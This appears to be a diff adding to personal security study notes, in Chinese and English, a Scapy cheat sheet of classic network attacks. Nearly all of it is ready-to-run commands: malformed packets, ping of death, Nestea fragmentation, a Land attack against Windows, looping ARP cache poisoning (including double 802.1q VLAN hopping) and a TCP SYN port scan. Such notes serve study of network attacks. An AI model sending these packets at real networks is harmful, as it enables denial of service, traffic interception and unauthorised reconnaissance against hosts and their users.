@@ -19,3 +19,44 @@ SQL 注入
 http://www.moon-soft.com/download/info/1132.htm
 
 修改数据包？有啥用？
+
+Classical attacks
+
+Malformed packets:
+
+>>> send(IP(dst="10.1.1.5", ihl=2, version=3)/ICMP())
+Ping of death (Muuahahah):
+
+>>> send( fragment(IP(dst="10.0.0.5")/ICMP()/("X"*60000)) )
+Nestea attack:
+
+>>> send(IP(dst=target, id=42, flags="MF")/UDP()/("X"*10))
+>>> send(IP(dst=target, id=42, frag=48)/("X"*116))
+>>> send(IP(dst=target, id=42, flags="MF")/UDP()/("X"*224))
+Land attack (designed for Microsoft Windows):
+
+>>> send(IP(src=target,dst=target)/TCP(sport=135,dport=135))
+　ARP cache poisoning
+
+这种攻击可以通过VLAN跳跃攻击投毒ARP缓存，使得其他客户端无法加入真正的网关地址。
+
+经典的ARP缓存投毒：　　　　
+
+>>> send( Ether(dst=clientMAC)/ARP(op="who-has", psrc=gateway, pdst=client),
+      inter=RandNum(10,40), loop=1 )
+使用double 802.1q封装进行ARP缓存投毒：
+
+>>> send( Ether(dst=clientMAC)/Dot1Q(vlan=1)/Dot1Q(vlan=2)
+      /ARP(op="who-has", psrc=gateway, pdst=client),
+      inter=RandNum(10,40), loop=1 )
+TCP Port Scanning
+
+发送一个TCP SYN到每一个端口上。等待一个SYN-ACK或者是RST或者是一个ICMP错误：
+
+>>> res,unans = sr( IP(dst="target")
+                /TCP(flags="S", dport=(1,1024)) )
+将开放的端口结果可视化：
+
+>>> res.nsummary( lfilter=lambda (s,r): (r.haslayer(TCP) and (r.getlayer(TCP).flags & 2)) )
+
+PORTSCAN 这样的工具
